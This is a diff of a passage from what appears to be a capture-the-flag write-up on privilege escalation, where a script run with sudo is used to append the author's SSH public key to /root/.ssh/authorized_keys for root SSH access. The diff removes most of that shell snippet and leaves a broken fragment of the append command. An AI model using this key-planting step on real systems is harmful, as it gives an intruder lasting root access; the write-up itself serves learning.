@@ -111,12 +111,7 @@ Here we see that the value of f is a constant 0, we change that to 1, our requir
 
 Now, we run the sudo command again. And this time we get command execution as root. Then, we get our id_rsa.pub using ssh-keygen and paste it to the authorized_keys file at /root/.ssh/ using the deploy.sh file to be able to SSH into the machine as root.
 
-`#!/bin/sh
-echo $(id)
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA***********************************************************************************************************************************************
-***************************************************************************************************************************************************************************************
-*********************************************************************************************************************************************************************************7BLa+Y
-zHy+9fuMs= root@kali" >> /root/.ssh/authorized_keys`
+`root@kali" >> /root/.ssh/authorized_keys`
 
 Finally we grab the root.txt file with SSH.
 
